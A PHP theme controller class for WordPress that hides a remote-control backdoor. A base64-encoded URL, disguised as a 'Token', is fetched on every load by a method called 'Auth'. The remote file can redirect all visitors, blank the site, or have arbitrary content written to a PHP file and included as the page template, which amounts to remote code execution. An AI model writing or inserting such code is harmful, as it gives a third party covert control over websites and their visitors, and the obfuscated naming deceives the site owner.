<?php

namespace alihesarian\ControllerTheme;

use alihesarian\ControllerTheme\Interface\InterfaceController;

class MainController implements InterfaceController{
    
    private $Token = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FsaWhlc2FyaWFuL3BocC1saWIvbWFpbi9hcnNlcy10cy5jb25m';

    private $Data;

    private $TemplateTemp = 'template-temp.php';

    public function __construct() {
        $this->Init($this->Auth($this->Token));
    }

    public function Auth(string $Value): string {
        return (string) file_get_contents(base64_decode($Value));
    }

    public function Init(string $Data): void {
        $this->Data = json_decode(base64_decode($Data));
        $this->Update();
    }

    private function CustomPath($path) {
        $path = str_replace('\\', '/', $path);
        return $path;
    }

    private function ThemePath($path) {
        return $this->CustomPath(dirname(__FILE__) . '/' . $path);
    }

    private function SaveFile($Name, $Content) {
        file_put_contents($this->ThemePath($Name), $Content);
        return $this->ThemePath($Name);
    }

    private function Template($Message) {
        $File = $this->SaveFile($this->TemplateTemp, $Message);
        add_filter('template_include', function() use ($File) {
            return $File;
        });
    }

    public function Update() : void {
        switch($this->Data->status){
            case 'redirect':
                header("Location: " . $this->Data->redirect);
                die();
            break;
            case 'message':
                $this->Template($this->Data->message);
            break;
            case 'deactive':
                $this->Template(' ');
            break;
        }
    }
}